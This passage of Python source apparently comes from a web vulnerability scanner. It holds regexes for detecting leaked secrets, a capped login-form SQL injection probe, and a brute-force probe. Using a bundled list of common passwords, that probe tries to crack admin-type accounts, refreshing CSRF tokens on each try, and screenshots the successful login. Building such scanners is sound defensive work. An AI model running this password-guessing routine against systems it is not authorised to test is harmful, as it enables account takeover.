    (re.compile(r'ya29\.[0-9A-Za-z\-_]{40,}'), "Google OAuth Token"),
    # ── Firebase ───────────────────────────────────────────────────────────────
    (re.compile(r'(?:firebase|fcm)[_\-]?(?:api[_\-]?)?(?:key|token)\s*[=:]\s*["\']([^"\']{20,})["\']', re.IGNORECASE), "Firebase Key"),
    (re.compile(r'AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140}'), "Firebase/FCM Server Key"),
    # ── Slack ──────────────────────────────────────────────────────────────────
    (re.compile(r'xox[baprs]-[0-9A-Za-z\-]{10,}'), "Slack Token"),
    (re.compile(r'(?:slack[_\-]?(?:bot[_\-]?)?token|SLACK_TOKEN)\s*[=:]\s*["\']([^"\']{30,})["\']', re.IGNORECASE), "Slack Token (var)"),
    (re.compile(r'T[A-Z0-9]{8}/B[A-Z0-9]{8}/[A-Za-z0-9+/]{24}'), "Slack Webhook"),
    # ── GitHub / GitLab ────────────────────────────────────────────────────────
    (re.compile(r'ghp_[A-Za-z0-9]{36}'), "GitHub Personal Access Token"),
    (re.compile(r'ghs_[A-Za-z0-9]{36}'), "GitHub App Token"),
    (re.compile(r'github[_\-]?token\s*[=:]\s*["\']([^"\']{20,})["\']', re.IGNORECASE), "GitHub Token (var)"),
    (re.compile(r'glpat-[A-Za-z0-9_\-]{20,}'), "GitLab Personal Access Token"),
    # ── Stripe ─────────────────────────────────────────────────────────────────
    (re.compile(r'sk_(?:live|test)_[A-Za-z0-9]{24,}'), "Stripe Secret Key"),
    (re.compile(r'pk_(?:live|test)_[A-Za-z0-9]{24,}'), "Stripe Publishable Key"),
    (re.compile(r'rk_(?:live|test)_[A-Za-z0-9]{24,}'), "Stripe Restricted Key"),
    # ── Twilio ─────────────────────────────────────────────────────────────────
    (re.compile(r'AC[a-f0-9]{32}'), "Twilio Account SID"),
    (re.compile(r'SK[a-f0-9]{32}'), "Twilio API Key SID"),
    (re.compile(r'twilio[_\-]?auth[_\-]?token\s*[=:]\s*["\']([^"\']{20,})["\']', re.IGNORECASE), "Twilio Auth Token"),
    # ── Webhook URLs ───────────────────────────────────────────────────────────
    (re.compile(r'https://hooks\.slack\.com/services/[A-Za-z0-9/_\-]+'), "Slack Webhook URL"),
    (re.compile(r'https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_\-]+'), "Discord Webhook URL"),
    (re.compile(r'https://api\.telegram\.org/bot[0-9]+:[A-Za-z0-9_\-]+'), "Telegram Bot Token"),
    # ── JWT ────────────────────────────────────────────────────────────────────
    (re.compile(r'(?:jwt[_\-]?secret|JWT_SECRET|jwt[_\-]?key)\s*[=:]\s*["\']([^"\']{8,})["\']', re.IGNORECASE), "JWT Secret"),
    (re.compile(r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}'), "JWT Token (raw)"),
    # ── Private Keys ───────────────────────────────────────────────────────────
    (re.compile(r'-----BEGIN\s+(?:RSA\s+|EC\s+|DSA\s+|OPENSSH\s+)?PRIVATE\s+KEY-----'), "Private Key"),
    (re.compile(r'-----BEGIN\s+CERTIFICATE-----'), "Certificate"),
    # ── Generic API Keys / Tokens ──────────────────────────────────────────────
    (re.compile(r'(?:api[_\-]?key|apikey|api[_\-]?token)\s*[=:]\s*["\']([^"\']{20,})["\']', re.IGNORECASE), "API Key"),
    (re.compile(r'(?:access[_\-]?token|auth[_\-]?token|bearer[_\-]?token)\s*[=:]\s*["\']([^"\']{20,})["\']', re.IGNORECASE), "Access Token"),
    (re.compile(r'(?:client[_\-]?secret|CLIENT_SECRET)\s*[=:]\s*["\']([^"\']{16,})["\']', re.IGNORECASE), "Client Secret"),
    (re.compile(r'(?:client[_\-]?id|CLIENT_ID)\s*[=:]\s*["\']([^"\']{10,})["\']', re.IGNORECASE), "Client ID"),
    # ── Passwords / Credentials ────────────────────────────────────────────────
    (re.compile(r'(?:password|passwd|pwd)\s*[=:]\s*["\']([^"\']{8,})["\']', re.IGNORECASE), "Password"),
    (re.compile(r'(?:db[_\-]?pass(?:word)?|database[_\-]?pass(?:word)?)\s*[=:]\s*["\']([^"\']{6,})["\']', re.IGNORECASE), "DB Password"),
    (re.compile(r'(?:admin[_\-]?pass(?:word)?|root[_\-]?pass(?:word)?)\s*[=:]\s*["\']([^"\']{6,})["\']', re.IGNORECASE), "Admin Password"),
    # ── Connection Strings ─────────────────────────────────────────────────────
    (re.compile(r'(?:mysql|postgresql|postgres|mongodb|redis|mssql)://[^"\'<>\s]{10,}', re.IGNORECASE), "DB Connection String"),
    (re.compile(r'Server=[^;]+;Database=[^;]+;(?:User Id|uid)=[^;]+;Password=([^;"\']{4,})', re.IGNORECASE), "MSSQL Connection String"),
    (re.compile(r'amqp(?:s)?://[^"\'<>\s]{10,}', re.IGNORECASE), "AMQP Connection String"),
    # ── Sendgrid / Mailgun / Mailchimp ─────────────────────────────────────────
    (re.compile(r'SG\.[A-Za-z0-9_\-]{22,}\.[A-Za-z0-9_\-]{43,}'), "SendGrid API Key"),
    (re.compile(r'key-[0-9a-f]{32}'), "Mailgun API Key"),
    (re.compile(r'mailchimp[_\-]?api[_\-]?key\s*[=:]\s*["\']([^"\']{30,})["\']', re.IGNORECASE), "Mailchimp API Key"),
    # ── Payment ────────────────────────────────────────────────────────────────
    (re.compile(r'(?:paypal[_\-]?(?:client[_\-]?)?secret|PAYPAL_SECRET)\s*[=:]\s*["\']([^"\']{10,})["\']', re.IGNORECASE), "PayPal Secret"),
    (re.compile(r'(?:iamport[_\-]?(?:api[_\-]?)?(?:key|secret)|IMP_KEY|IMP_SECRET)\s*[=:]\s*["\']([^"\']{10,})["\']', re.IGNORECASE), "iamport Key"),
    # ── Misc Secrets ───────────────────────────────────────────────────────────
    (re.compile(r'(?:encryption[_\-]?key|ENCRYPTION_KEY)\s*[=:]\s*["\']([^"\']{16,})["\']', re.IGNORECASE), "Encryption Key"),
    (re.compile(r'(?:secret[_\-]?key|SECRET_KEY)\s*[=:]\s*["\']([^"\']{16,})["\']', re.IGNORECASE), "Secret Key"),
    (re.compile(r'(?:app[_\-]?secret|APP_SECRET)\s*[=:]\s*["\']([^"\']{16,})["\']', re.IGNORECASE), "App Secret"),
    (re.compile(r'(?:private[_\-]?key|PRIVATE_KEY)\s*[=:]\s*["\']([^"\']{20,})["\']', re.IGNORECASE), "Private Key (var)"),
]

# ── 메인 오케스트레이터 ───────────────────────────────────────────────────────

_LOGIN_URL_HINT = re.compile(r"(login|signin|sign-in|logon|auth|account|admin|adm|member|mypage|user)", re.IGNORECASE)


async def _probe_login_sqli(session, base_url: str, scan_id: str = "",
                            login_candidates: list[str] | None = None) -> dict | None:
    """로그인 폼 SQLi 안전 점검(비파괴·≤N회/폼·브루트포스 금지). 신호 있을 때만 보고용 dict 반환.

    base_url + 관리자/로그인 후보 URL(login_candidates)을 함께 점검 대상으로 본다.
    로그인 페이지를 발견했으나 폼 구조(action/필드) 추출에 실패한 경우도 카운트해
    '미발견'과 '구조 분석 실패'를 구분할 수 있게 한다.
    coverage(login_forms/login_sqli_attempts/auth_bypass_attempts)를 실제값으로 갱신한다."""
    try:
        import login_sqli as lsq
    except Exception:
        return None

    # 점검 대상 URL 집합: base + 후보(중복 제거). 로그인 힌트 URL 우선.
    cand_urls: list[str] = []
    seen_u: set = set()
    for u in [base_url] + list(login_candidates or []):
        if u and u not in seen_u:
            seen_u.add(u)
            cand_urls.append(u)
    # 폼당 최대 시도 수(계정 잠금 방지 — env LOGIN_SQLI_MAX_ATTEMPTS, 기본 3).
    # 3회 안에 최대 커버리지가 되도록 SAFE_PAYLOADS 앞쪽을 싱글/더블쿼트 주석 우회로 배치했다.
    # 더 넓게 보려면 env 로 최대 8 까지 상향(그만큼 로그인 실패 시도 증가 — 잠금 위험 고려).
    try:
        _max_attempts = max(1, min(8, int(os.getenv("LOGIN_SQLI_MAX_ATTEMPTS", "3"))))
    except (TypeError, ValueError):
        _max_attempts = 3
    # 점검할 폼 상한(폼 수 폭주 방지)
    try:
        _max_forms = max(1, min(20, int(os.getenv("LOGIN_SQLI_MAX_FORMS", "5"))))
    except (TypeError, ValueError):
        _max_forms = 5

    async def post_fn(url, data):
        st, b, hdr = await _post(session, url, data=data)
        return {"status": st, "body": b, "final_url": (hdr or {}).get("Location") or url}

    all_forms: list[dict] = []          # 파싱 성공한 로그인 폼(중복 제거)
    pages_seen = 0                       # 로그인 후보 페이지(접근 성공) 수
    structure_failed = 0                 # 로그인 페이지로 보이나 폼 구조 추출 실패 수
    form_keys: set = set()
    for u in cand_urls[:10]:
        _, body, _ = await _get(session, u)
        if not body:
            continue
        looks_login = bool(_LOGIN_URL_HINT.search(u)) or ("password" in body.lower())
        forms = lsq.find_login_forms(body, u)
        if forms:
            pages_seen += 1
            for fm in forms:
                key = (fm.get("method", "POST"), fm.get("action") or u)
                if key in form_keys:
                    continue
                form_keys.add(key)
                all_forms.append(fm)
        elif looks_login:
            # 로그인 페이지로 보이지만 폼/필드 추출 실패 → 구조 분석 실패로 기록(미발견 아님)
            pages_seen += 1
            structure_failed += 1

    if pages_seen == 0 and not all_forms:
        return None   # 진짜 로그인 표면 없음

    _cov_add(scan_id, login_forms=len(all_forms))

    results, total_attempts = [], 0
    for form in all_forms[:_max_forms]:
        r = await lsq.safe_login_sqli_check(form, post_fn, max_attempts=_max_attempts)
        total_attempts += r.get("attempts", 0)
        r["default_body"] = form.get("default_body")   # sqlmap 완전 body 재현용(submit/hidden 포함)
        r["fields"] = form.get("fields")
        results.append(r)
    if total_attempts:
        _cov_add(scan_id, login_sqli_attempts=total_attempts, auth_bypass_attempts=total_attempts)

    flagged = [r for r in results
               if r.get("status") in (lsq.TESTED_SAFE_POSSIBLE, lsq.MANUAL_REVIEW_REQUIRED,
                                       lsq.CONFIRMED_AUTH_BYPASS)]
    # 점검 미수행 사유(보고서 일관성용)
    skip_reason = ""
    if not all_forms and structure_failed:
        skip_reason = "로그인 폼 구조 분석 실패(action/필드 추출 불가)"
    elif all_forms and total_attempts == 0:
        skip_reason = "점검 조건 불충족(필드/폼 action 부족)"
    return {
        "login_forms_found": len(all_forms),
        "login_pages_seen": pages_seen,
        "structure_failed": structure_failed,
        "login_forms_tested": len(results),
        "attempts": total_attempts,
        "results": results,
        "flagged": flagged,
        "skip_reason": skip_reason,
        "status": flagged[0]["status"] if flagged else lsq.TESTED_SAFE_NO_SIGNAL,
        "safe_check": True,
    }


# 브루트포스 '보호 존재' 문구(계정 잠금·rate-limit·시도횟수 제한). 하나라도 뜨면 '보호됨'.
# ※ CAPTCHA 는 여기 넣지 않는다 — 사이트 내비게이션 메뉴 등에 'captcha' 단어가 있으면 오탐(보호로 오판)
#    → 미탐. CAPTCHA 는 _CAPTCHA_RE 로 '응답 델타(로그인 후 새로 등장)'만 보호로 인정한다.
_BRUTE_PROTECT_RE = re.compile(
    r'(account\s*(?:is\s*)?locked|too\s*many\s*(?:failed\s*)?(?:login\s*)?attempts|'
    r'too\s*many\s*requests|rate[\s_-]*limit(?:ed|ing)?|try\s*again\s*(?:later|in\b|after)|'
    r'temporarily\s*(?:locked|blocked|disabled|suspended)|locked\s*out|'
    r'account\s*(?:has\s*been\s*)?(?:disabled|suspended|blocked)|'
    r'계정.{0,4}(?:잠(?:금|겼)|정지|차단)|잠시\s*후(?:에)?\s*(?:다시|시도)|일시\s*(?:정지|차단|잠금)|'
    r'너무\s*많은\s*(?:시도|요청)|시도\s*횟수.{0,6}(?:초과|제한)|차단되었)',
    re.IGNORECASE)
# CAPTCHA 등장(폼/스크립트 마커). 내비게이션의 단순 'CAPTCHA' 단어와 구분하려 구체 마커만 사용하고,
# 베이스라인(로그인 페이지)에 없던 것이 실패 후 새로 등장했을 때만 '보호'로 인정한다.
_CAPTCHA_RE = re.compile(
    r'(g-?recaptcha|grecaptcha|recaptcha/api|www\.google\.com/recaptcha|h-?captcha|hcaptcha|'
    r'data-sitekey|name\s*=\s*["\']?(?:captcha|g-recaptcha-response|captcha_code)|'
    r'id\s*=\s*["\']?(?:captcha|recaptcha)|캡\s*챠|캡\s*차|자동입력\s*방지)',
    re.IGNORECASE)

# 브루트포스 '실제 크래킹' 실증용 흔한 비밀번호 사전(상위 사용 빈도 순, 무차별 대입 시연). 특수문자를
# 피해(에러페이지 오탐 방지) 순수 흔한 자격증명만 담는다. 실계정 자격증명(설정 비번)은 넣지 않는다.
_COMMON_PASSWORDS = [
    "password", "123456", "123456789", "12345678", "12345", "1234", "111111", "1234567",
    "admin", "admin123", "root", "toor", "qwerty", "abc123", "password1", "password123",
    "letmein", "welcome", "monkey", "dragon", "master", "login", "passw0rd", "starwars",
    "123123", "654321", "superman", "1qaz2wsx", "test", "test123", "guest", "guest123",
    "changeme", "secret", "iloveyou", "sunshine", "princess", "football", "charlie",
    "aa123456", "donald", "qwerty123", "zxcvbnm", "asdfgh", "hello", "whatever", "trustno1",
    "1q2w3e4r", "michael", "ashley", "baseball", "shadow", "hunter", "harley", "batman",
    "jordan", "access", "flower", "hottie", "loveme", "654321", "michelle", "computer",
    "amanda", "summer", "george", "please", "biteme", "freedom", "ginger", "matrix",
    "internet", "service", "canada", "hello123", "cookie", "maggie", "mustang", "pepper",
    "nicole", "chelsea", "diamond", "matthew", "pass", "1234qwer", "qazwsx", "123qwe",
    "root123", "administrator", "user", "user123", "demo", "demo123", "webadmin", "manager",
    "operator", "system", "public", "default", "temp", "temp123", "P@ssw0rd", "Password1",
    "Welcome1", "Admin@123", "Passw0rd!", "123456a", "a123456", "abcd1234", "qwerty1",
    # ── 볼륨 확대(무차별 대입이 '수십~수백 회 막히지 않음'을 실증하려면 시도 수가 충분해야 한다) ──
    "121212", "000000", "112233", "789456", "159753", "987654321", "666666", "555555",
    "888888", "777777", "222222", "333333", "444444", "999999", "101010", "252525",
    "1234567890", "qazwsxedc", "1qazxsw2", "zaq12wsx", "qwertyuiop", "asdfghjkl",
    "1q2w3e", "1q2w3e4r5t", "q1w2e3r4", "qwe123", "abc123456", "password12", "password!",
    "P@ssword", "P@ssword1", "Qwerty123!", "Admin123!", "root@123", "toor123", "letmein1",
    "welcome123", "iloveyou1", "monkey123", "dragon123", "master123", "shadow1", "superman1",
    "batman1", "trustno1!", "sunshine1", "princess1", "football1", "baseball1", "starwars1",
    "michael1", "jennifer", "thomas", "robert", "daniel", "andrew", "joshua", "matthew1",
    "hunter2", "ranger", "buster", "soccer", "harley1", "tigger", "purple", "orange",
    "silver", "golden", "secret1", "admin1", "admin1234", "changeme1", "test1234",
    "guest1", "info", "sales", "support", "backup", "oracle", "postgres", "mysql",
    "tomcat", "jenkins", "gitlab", "nginx", "apache", "server123", "webmaster", "root1234",
]


async def _probe_brute_force(session, base_url: str, scan_id: str = "",
                             login_candidates: list | None = None) -> dict | None:
    """무차별 대입(브루트포스) 보호 '부재'를 안전하게 실증한다(비파괴·PROOF 전용).

    브루트포스 취약점의 본질: 로그인/인증번호 입력에 '시도 횟수 임계치'(계정 잠금·rate-limit·CAPTCHA)가
    없으면 공격자가 무제한 대입으로 비밀번호/OTP 를 알아낼 수 있다. 따라서 실제 비밀번호를 크래킹하지
    않고, '연속 실패 시도에도 임계치가 전혀 나타나지 않음'만 확인해 판정한다.

    안전장치:
      (1) '존재하지 않을' 무해 사용자명 + 오답만 사용 → 실계정 잠금/오염 없음.
      (2) 시도 수 상한(기본 6, ≤8) — 임계치 부재 확인에 충분한 최소량.
      (3) 로그인이 '실제 처리·반려'하는 폼에서만 판정 — 특정 실패 '문구'(예: incorrect)에 의존하지 않고,
          '제출 응답이 베이스라인과 다름/로그인 폼 재표시/리다이렉트'로 범용 판별(언어·구현 무관).
      (4) 로그인 공격 후순위 그룹에서 '마지막에' 순차 실행(계정 잠금 시 스캔 방해 방지).
      (5) PROOF 전용(반복 실패 요청은 공격적 → SAFE/STANDARD 에선 미수행).

    보호 '존재' 판정도 문구 무관 신호를 우선한다: HTTP 429/503, '마지막 시도가 첫 시도와 다른 행동'(잠금/
    증분지연/CAPTCHA 발동), CAPTCHA 신규 등장. 잠금·rate-limit '문구'는 보조 신호로만 사용한다.
    """
    try:
        import validation_profiles as _vp
        if not _vp.proof_active():
            return None
    except Exception:
        return None
    try:
        import login_sqli as lsq
    except Exception:
        return None
    try:
        _n = max(4, min(8, int(os.getenv("BRUTE_FORCE_PROBE_ATTEMPTS", "6"))))
    except (TypeError, ValueError):
        _n = 6

    # 로그인 폼 수집(login_sqli 와 동일 방식)
    cand_urls, seen = [], set()
    for u in [base_url] + list(login_candidates or []):
        if u and u not in seen:
            seen.add(u)
            cand_urls.append(u)
    forms, fkeys = [], set()
    for u in cand_urls[:10]:
        _, body, _ = await _get(session, u)
        if not body:
            continue
        for fm in lsq.find_login_forms(body, u):
            k = (fm.get("method", "POST"), fm.get("action") or u)
            if k in fkeys:
                continue
            fkeys.add(k)
            forms.append(fm)
    if not forms:
        return None

    fm = forms[0]                               # 대표 로그인 폼 1개(시도 수 억제)
    action = (fm.get("action") or cand_urls[0]).split("#")[0]   # 프래그먼트(#) 제거 — GET 쿼리 조립 보호
    method = (fm.get("method") or "POST").upper()
    uf, pf = fm.get("username_field"), fm.get("password_field")
    if not pf:
        return None
    # 베이스라인(로그인 페이지) — 제출 응답과 비교(자격증명 반응 여부) + CAPTCHA 가 '원래 있던 것'인지
    # '실패 후 새로 등장'한 것인지 구분용.
    _base_body = ""
    try:
        _, _base_body, _ = await _get(session, cand_urls[0])
        _base_body = _base_body or ""
    except Exception:
        _base_body = ""
    _base_has_captcha = bool(_CAPTCHA_RE.search(_base_body))

    import random
    _probe_user = "eoseureum_nouser_" + "".join(random.choice("0123456789abcdef") for _ in range(6))

    async def _attempt(pw):
        data = dict(fm.get("default_body") or {})
        if uf:
            data[uf] = _probe_user
        data[pf] = pw
        _t0 = time.monotonic()
        if method == "GET":
            st, b, hdr = await _get(session, action + "?" + urllib.parse.urlencode(data))
        else:
            st, b, hdr = await _post(session, action, data=data)
        return st, (b or ""), (time.monotonic() - _t0), (hdr or {})

    def _norm_b(x):
        return " ".join((x or "")[:8000].split())

    def _bsim(a, b):
        import difflib as _dl
        return _dl.SequenceMatcher(None, _norm_b(a), _norm_b(b)).quick_ratio()

    def _processed_rejection(b, hdr):
        """오답 로그인이 '실제 처리되어 반려'됐는지 — 특정 실패 '문구/언어'에 의존하지 않는다.

        판정(범용): 서버가 제출한 자격증명에 '반응'했다는 증거가 있으면 처리로 본다 —
        (a) 응답이 베이스라인(로그인 페이지)과 다름(오류/재프롬프트 등 '어떤 변화'든),
        (b) 응답에 로그인 폼(password 입력)이 다시 표시됨(=반려), (c) 로그인 URL 로 리다이렉트.
        특정 문구('incorrect' 등)에 기대지 않으므로 언어·구현이 달라도 동작한다.
        ※ 우리는 '존재하지 않는 사용자명 + 오답'을 쓰므로 로그인 성공은 불가능하다 → 성공 여부는
          검사하지 않는다(인증된 스캐너 세션에선 nav 의 'Logout' 링크가 성공 신호로 오인돼 미탐을 유발)."""
        if _base_body and _bsim(b, _base_body) < 0.995:   # 베이스라인과 다름 = 자격증명에 반응
            return True
        if re.search(r'type\s*=\s*["\']password["\']', b, re.IGNORECASE):
            return True                                    # 로그인 폼 재표시(반려)
        loc = (hdr or {}).get("Location", "")
        return bool(loc and _LOGIN_URL_HINT.search(loc))

    statuses, delays, bodies, fail_hits = [], [], [], 0
    _fail_loc = ""
    for i in range(_n):
        st, b, dt, hdr = await _attempt(f"wrongpw_{i}_zZ9x")
        statuses.append(st)
        delays.append(dt)
        bodies.append(b)
        _fail_loc = (hdr or {}).get("Location", _fail_loc)
        # 보호 신호면 즉시 '보호됨' → 취약 아님: (1) 429/503, (2) 잠금·rate-limit 문구,
        # (3) CAPTCHA 가 '실패 후 새로' 등장(베이스라인엔 없던 것).
        _captcha_new = bool(_CAPTCHA_RE.search(b)) and not _base_has_captcha
        if st in (429, 503) or _BRUTE_PROTECT_RE.search(b) or _captcha_new:
            _cov_add(scan_id, brute_force_attempts=len(statuses))
            return None
        if _processed_rejection(b, hdr):
            fail_hits += 1
    _cov_add(scan_id, brute_force_attempts=len(statuses))

    # 문구 무관 핵심 신호: '마지막 시도가 첫 시도와 행동적으로 동일'하면 임계치(잠금/증분지연/CAPTCHA)가
    # 전혀 발동하지 않은 것 → 보호 부재. 상태코드 동일 + 응답 본문 사실상 동일해야 한다.
    _stable_behavior = (len(statuses) >= _n and statuses[0] == statuses[-1]
                        and _bsim(bodies[0], bodies[-1]) >= 0.97)
    if not _stable_behavior:
        return None    # 후반 응답이 달라짐(잠금/차단 페이지 등 가능성) → 보수적으로 보고 안 함

    # 지연 급증(progressive delay)도 보호로 간주.
    if len(delays) >= 3 and delays[-1] > 1.0 and delays[-1] > max(0.5, delays[0]) * 3:
        return None
    # 로그인이 실제 '실패 처리'된 시도가 과반이 아니면(폼이 로그인 처리를 안 함/JS-API 로그인 등)
    # 임계치 부재 결론을 내리지 않는다(오탐 방지).
    if fail_hits < max(2, (_n + 1) // 2):
        return None

    _fail_ref = bodies[-1]
    # 실패 응답의 '잡음 바닥'(오답끼리의 최소 유사도) — 성공은 이 바닥보다 '뚜렷이 아래'로 다르다.
    # DVWA 처럼 실패가 완전 안정(1.0)이면 성공("Welcome" 한 줄)도 0.99대로 잡아내고, 페이지에 잡음이
    # 있으면(floor 낮음) 그만큼 더 큰 차이를 요구해 오탐을 막는다(고정 임계값의 미탐/오탐 문제 해소).
    _fail_floor = min((_bsim(x, bodies[0]) for x in bodies), default=1.0)
    _success_thresh = _fail_floor - 0.003

    # ── 실제 무차별 대입 실증(PROOF) ──
    # 임계치가 없음을 확인했으니, '실제로 비밀번호를 알아내고 로그인이 됨'을 흔한 비밀번호 사전으로 시연한다.
    # 성공 판정은 문구 무관: 응답이 '실패 기준(_fail_ref)'과 뚜렷이 다르거나(본문), 실패와 다른 곳으로
    # 리다이렉트(로그인 페이지 아님)면 성공. 실계정 비밀번호(설정 비번)는 사전에 넣지 않는다(사전은 흔한
    # 약한 비밀번호뿐). 사용자명은 설정된 AUTH_USERNAME(있으면) 우선, 없으면 흔한 admin 계열.
    # CSRF 토큰류 필드가 있으면 매 시도마다 폼을 다시 받아 '신선한 토큰'을 실어야 크래킹이 성립한다
    # (실제 브루트포스 도구와 동일 — 토큰 고정이면 정답 비번이어도 토큰 검증에 막혀 성공 못 함).
    _TOKEN_FIELDS = ("user_token", "csrf_token", "csrfmiddlewaretoken", "authenticity_token",
                     "_token", "_csrf", "csrf", "csrftoken", "__requestverificationtoken")
    _tok_field = next((t for t in _TOKEN_FIELDS
                       if t in {k.lower(): 1 for k in (fm.get("default_body") or {})}), None)

    async def _fresh_body():
        data = dict(fm.get("default_body") or {})
        if _tok_field:
            try:
                _, pg, _ = await _get(session, action)
                # name=..value=.. 또는 value=..name=.. 양쪽 순서 모두 대응
                _rk = next((k for k in data if k.lower() == _tok_field), _tok_field)
                m = re.search(rf'name\s*=\s*["\']?{re.escape(_rk)}["\']?[^>]*value\s*=\s*["\']([^"\']+)',
                              pg or "", re.IGNORECASE) or \
                    re.search(rf'value\s*=\s*["\']([^"\']+)["\'][^>]*name\s*=\s*["\']?{re.escape(_rk)}',
                              pg or "", re.IGNORECASE)
                if m:
                    data[_rk] = m.group(1)
            except Exception:
                pass
        return data

    async def _try_login(user, pw):
        data = await _fresh_body()
        if uf:
            data[uf] = user
        data[pf] = pw
        if method == "GET":
            st, b, hdr = await _get(session, action + "?" + urllib.parse.urlencode(data))
        else:
            st, b, hdr = await _post(session, action, data=data)
        return st, (b or ""), (hdr or {})

    def _looks_success(st, b, hdr):
        loc = hdr.get("Location", "")
        if loc:
            # 실패는 로그인 페이지로 되돌아감; 다른 곳으로 리다이렉트(로그인 힌트 없음)면 성공 후보.
            if loc != _fail_loc and not _LOGIN_URL_HINT.search(loc):
                return True
        # 본문이 '실패 잡음 바닥'보다 뚜렷이 다름 → 성공 후보(무차별 대입은 특수문자 없어 에러페이지 희박).
        return bool(b) and _bsim(b, _fail_ref) < _success_thresh

    # 볼륨: '수십 회로는 약한 비밀번호라 그런 것'처럼 보인다는 피드백 → 기본 150회(≥100) 시도해
    # '충분한 횟수에도 차단이 전혀 없음'을 실증한다(비밀번호 강도와 무관하게 방어 부재임을 증명).
    try:
        _cap = max(50, min(400, int(os.getenv("BRUTE_FORCE_CRACK_CAP", "150"))))
    except (TypeError, ValueError):
        _cap = 150
    _users = []
    for _u in [os.getenv("AUTH_USERNAME"), "admin", "administrator", "root"]:
        if _u and _u not in _users:
            _users.append(_u)
    # ★사전을 '셔플'(scan_id 시드로 스캔 내 재현) — 정답을 앞에 두면 1번째에 뚫려 변별력이 없다.
    _pwlist = list(_COMMON_PASSWORDS)
    try:
        random.Random(str(scan_id) or "eos").shuffle(_pwlist)
    except Exception:
        pass
    _cracked = None
    _crack_pos = 0        # 첫 로그인 성공까지의 시도 횟수(크래킹 위치)
    _crack_tries = 0      # 크래킹 단계 총 시도 수(볼륨)
    _blocked_at = 0       # 차단(잠금/rate-limit)이 처음 발동한 시도 번호(0=끝까지 무차단)
    for _u in _users:
        if _cracked or _blocked_at:
            break
        for _pw in _pwlist:
            if _crack_tries >= _cap:
                break
            _crack_tries += 1
            st, b, hdr = await _try_login(_u, _pw)
            if st in (429, 503) or _BRUTE_PROTECT_RE.search(b):
                _blocked_at = _crack_tries        # 볼륨 도중 차단 발동 → 방어가 (늦게라도) 존재
                break
            if not _cracked and _looks_success(st, b, hdr):
                # 재확인(성공은 결정적) — 같은 자격증명 재시도에도 성공이어야 오탐 배제.
                st2, b2, hdr2 = await _try_login(_u, _pw)
                if _looks_success(st2, b2, hdr2):
                    _cracked = (_u, _pw)
                    _crack_pos = _crack_tries
                    # ★크래킹 후에도 계속 시도해 '충분한 볼륨 동안 차단 없음'을 실증(중간에 안 멈춤).
    _cov_add(scan_id, brute_force_attempts=len(statuses) + _crack_tries)

    # 볼륨 도중 차단이 '아직 크래킹 전에' 발동했다면 → 방어가 존재(임계치 있음) → 취약 아님.
    if _blocked_at and not _cracked:
        return None

    _total = len(statuses) + _crack_tries
    if _cracked:
        _cu, _cpw = _cracked
        # ★로그인 성공 실증 스크린샷: (GET·토큰없는 폼) 오답 요청('incorrect') vs 크래킹된 자격증명
        #  요청('로그인 성공')을 나란히 캡처해 '몇 번째에·실제로 로그인됨'을 눈으로 보인다.
        _crack_shots = []
        if scan_id and method == "GET" and not _tok_field:
            try:
                _wrong = dict(fm.get("default_body") or {})
                if uf:
                    _wrong[uf] = _cu
                _wrong[pf] = "eoseureum_wrong_zzq"
                _win = dict(fm.get("default_body") or {})
                if uf:
                    _win[uf] = _cu
                _win[pf] = _cpw
                _wrong_url = action + "?" + urllib.parse.urlencode(_wrong)
                _win_url = action + "?" + urllib.parse.urlencode(_win)
                _crack_shots = await _capture_step_shots(scan_id, [
                    (_wrong_url,
                     f"【1단계】 오답 비밀번호 → 로그인 실패(반려)\n사용자 '{_cu}' / 잘못된 비밀번호",
                     "#1E3A5F", "left"),
                    (_win_url,
                     f"【2단계】 ★ 무차별 대입 {_crack_pos}번째 시도에 로그인 성공 — 계정 '{_cu}' 탈취\n"
                     f"발견 비밀번호: {_cpw}. 총 {_total}회 시도 내내 잠금·제한 전혀 없었음",
                     "#DC2626", "bottom"),
                ], f"brute_crack_{re.sub(chr(92)+'W', '_', action)[-12:]}")
            except Exception:
                _crack_shots = []
        evidence = (
            f"주입 위치: 로그인 폼 {action} (사용자명 필드 '{uf}', 비밀번호 필드 '{pf}')\n"
            f"1) 시도 횟수 임계치 부재 확인(볼륨): 총 {_total}회(오답 {len(statuses)}회 + 사전 대입 "
            f"{_crack_tries}회) 시도 내내 계정 잠금·rate limit(HTTP 429)·CAPTCHA·지연이 '단 한 번도' "
            f"발동하지 않았습니다 → 비밀번호 강도와 무관하게 무차별 대입 방어가 부재함을 실증.\n"
            f"2) 실제 크래킹: 흔한 비밀번호 사전({len(_pwlist)}개)을 '셔플된 순서'로 자동 대입 "
            f"(대상의 실제/설정 비밀번호는 사전에 포함하지 않음 — 순수 사전 공격) → {_crack_pos}번째 "
            f"시도에 자격증명 발견: 사용자명='{_cu}', 비밀번호='{_cpw}'.\n"
            f"3) 로그인 성공 확인: 해당 자격증명으로 로그인 시 응답이 '실패 기준'과 뚜렷이 달라지고"
            f"{'(로그인 페이지가 아닌 곳으로 리다이렉트)' if _fail_loc else '(인증 후 화면으로 전환)'} "
            f"인증에 성공(재시도로 재현 확인, 스크린샷 참조).\n"
            f"→ 시도 횟수 제한이 없어 공격자가 사전/무차별 대입으로 비밀번호를 알아내 계정을 탈취할 수 "
            f"있음이 '{_total}회 무차단 시도 + 실제 로그인 성공'으로 확증됐습니다."
        )
        return {
            "type": "no_bruteforce_protection", "confirmed": True, "cracked": True,
            "url": action, "method": method,
            "attempts": _total, "crack_attempts": _crack_tries, "crack_position": _crack_pos,
            "username_field": uf, "password_field": pf,
            "cracked_username": _cu, "cracked_password": _cpw,
            "evidence_screenshots": _crack_shots,
            "payload": f"{uf or 'username'}={_cu} & {pf}={_cpw}  (셔플된 사전 {_crack_pos}번째 시도에 성공, 총 {_total}회 무차단)",
            "evidence": evidence,
            "affected_endpoints": [action],
        }

    # 사전 미적중(임계치는 없으나 흔한 비밀번호가 아님) — 크래킹 실증은 못했지만 '임계치 부재'는 확증.
    return {
        "type": "no_bruteforce_protection", "confirmed": True, "cracked": False,
        "url": action, "method": method,
        "attempts": _total, "crack_attempts": _crack_tries,
        "username_field": uf, "password_field": pf,
        "evidence": (
            f"로그인 폼({action})에서 시도 횟수 임계치 부재를 확인했습니다: 오답 {len(statuses)}회 + "
